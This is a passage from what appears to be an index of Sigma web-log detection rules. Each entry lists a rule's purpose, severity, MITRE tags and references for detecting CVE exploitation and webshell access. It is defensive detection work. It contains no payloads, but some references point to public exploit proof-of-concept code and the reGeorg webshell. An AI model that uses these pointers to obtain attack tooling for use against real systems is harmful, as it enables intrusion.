    Detects possible exploitation activity or bugs in a web application

    * Level: medium
    * MITRE: attack.initial_access
    * MITRE: attack.t1190
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/web/web_multiple_susp_resp_codes_single_source.yml
    
### CVE-2020-5902 F5 BIG-IP Exploitation Attempt
    
    Detects the exploitation attempt of the vulnerability found in F5 BIG-IP and described in CVE-2020-5902

    * Level: critical
    * MITRE: attack.initial_access
    * MITRE: attack.t1190
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/web/web_cve_2020_5902_f5_bigip.yml
* https://support.f5.com/csp/article/K52145254

* https://www.ptsecurity.com/ww-en/about/news/f5-fixes-critical-vulnerability-discovered-by-positive-technologies-in-big-ip-application-delivery-controller/

* https://twitter.com/yorickkoster/status/1279709009151434754

* https://www.criticalstart.com/f5-big-ip-remote-code-execution-exploit/

    
### CVE-2010-5278 Exploitation Attempt
    
    MODx manager - Local File Inclusion:Directory traversal vulnerability in manager/controllers/default/resource/tvs.php in MODx Revolution 2.0.2-pl, and possibly earlier, when magic_quotes_gpc is disabled, allows remote attackers to read arbitrary files via a .. (dot dot) in the class_key parameter.

    * Level: critical
    * MITRE: attack.initial_access
    * MITRE: attack.t1190
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/web/web_cve_2010_5278_exploitation_attempt.yml
* https://github.com/projectdiscovery/nuclei-templates

    
### Webshell ReGeorg Detection Via Web Logs
    
    Certain strings in the uri_query field when combined with null referer and null user agent can indicate activity associated with the webshell ReGeorg.

    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.t1505.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/web/win_webshell_regeorg.yml
* https://community.rsa.com/community/products/netwitness/blog/2019/02/19/web-shells-and-netwitness-part-3

* https://github.com/sensepost/reGeorg

    
### CVE-2021-33766 Exchange ProxyToken Exploitation
    
    Detects the exploitation of Microsoft Exchange ProxyToken vulnerability as described in CVE-2021-33766

    * Level: critical
    * MITRE: attack.initial_access
    * MITRE: attack.t1190
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/web/web_cve_2021_33766_msexchange_proxytoken.yml
* https://www.zerodayinitiative.com/blog/2021/8/30/proxytoken-an-authentication-bypass-in-microsoft-exchange-server

    
### Webshell Detection by Keyword
    
    Detects webshells that use GET requests by keyword searches in URL strings

    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.t1505.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/web/web_webshell_keyword.yml
    
### Exploitation of CVE-2021-26814 in Wazuh
    
    Detects the exploitation of the Wazuh RCE vulnerability described in CVE-2021-26814

    * Level: high
    * MITRE: attack.initial_access
    * MITRE: attack.t1190
    * MITRE: cve.2021.21978
    * MITRE: cve.2021.26814
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/web/web_cve_2021_26814_wzuh_rce.yml
* https://github.com/WickdDavid/CVE-2021-26814/blob/main/PoC.py

    
### CVE-2020-0688 Exploitation Attempt
    
    Detects CVE-2020-0688 Exploitation attempts

    * Level: high
    * MITRE: attack.initial_access
    * MITRE: attack.t1190
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/web/web_exchange_cve_2020_0688_exploit.yml
* https://github.com/Ridter/cve-2020-0688

    
### Nginx Core Dump
    
    Detects a core dump of a crashing Nginx worker process, which could be a signal of a serious problem or exploitation attempts.

    * Level: high
    * MITRE: attack.impact
    * MITRE: attack.t1499.004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/web/web_nginx_core_dump.yml
* https://docs.nginx.com/nginx/admin-guide/monitoring/debugging/#enabling-core-dumps

* https://www.x41-dsec.de/lab/advisories/x41-2021-002-nginx-resolver-copy/

    
### CVE-2020-0688 Exchange Exploitation via Web Log
    
    Detects the exploitation of Microsoft Exchange vulnerability as described in CVE-2020-0688

    * Level: critical
    * MITRE: attack.initial_access
    * MITRE: attack.t1190
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/web/web_cve_2020_0688_msexchange.yml
* https://www.trustedsec.com/blog/detecting-cve-20200688-remote-code-execution-vulnerability-on-microsoft-exchange-server/

    
### Citrix Netscaler Attack CVE-2019-19781
    
    Detects CVE-2019-19781 exploitation attempt against Citrix Netscaler, Application Delivery Controller and Citrix Gateway Attack

    * Level: critical
    * MITRE: attack.initial_access
    * MITRE: attack.t1190
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/web/web_citrix_cve_2019_19781_exploit.yml
* https://support.citrix.com/article/CTX267679

* https://support.citrix.com/article/CTX267027

* https://isc.sans.edu/diary/25686

* https://twitter.com/mpgn_x64/status/1216787131210829826

* https://github.com/x1sec/x1sec.github.io/blob/master/CVE-2019-19781-DFIR.md

    
### Solarwinds SUPERNOVA Webshell Access
    
    Detects access to SUPERNOVA webshell as described in Guidepoint report

    * Level: critical
    * MITRE: attack.persistence
    * MITRE: attack.t1505.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/web/web_solarwinds_supernova_webshell.yml
* https://www.guidepointsecurity.com/supernova-solarwinds-net-webshell-analysis/

* https://www.anquanke.com/post/id/226029

    
### Successful Exchange ProxyShell Attack
    
    Detects URP patterns and status codes that indicate a successful ProxyShell exploitation attack against Exchange servers

    * Level: critical
    * MITRE: attack.initial_access
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/web/web_exchange_proxyshell_successful.yml
* https://youtu.be/5mqid-7zp8k?t=2231

* https://blog.orange.tw/2021/08/proxylogon-a-new-attack-surface-on-ms-exchange-part-1.html

* https://peterjson.medium.com/reproducing-the-proxyshell-pwn2own-exploit-49743a4ea9a1

    
### Fortinet CVE-2018-13379 Exploitation
    
    Detects CVE-2018-13379 exploitation attempt against Fortinet SSL VPNs

    * Level: critical
    * MITRE: attack.initial_access
    * MITRE: attack.t1190
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/web/web_fortinet_cve_2018_13379_preauth_read_exploit.yml
* https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn/
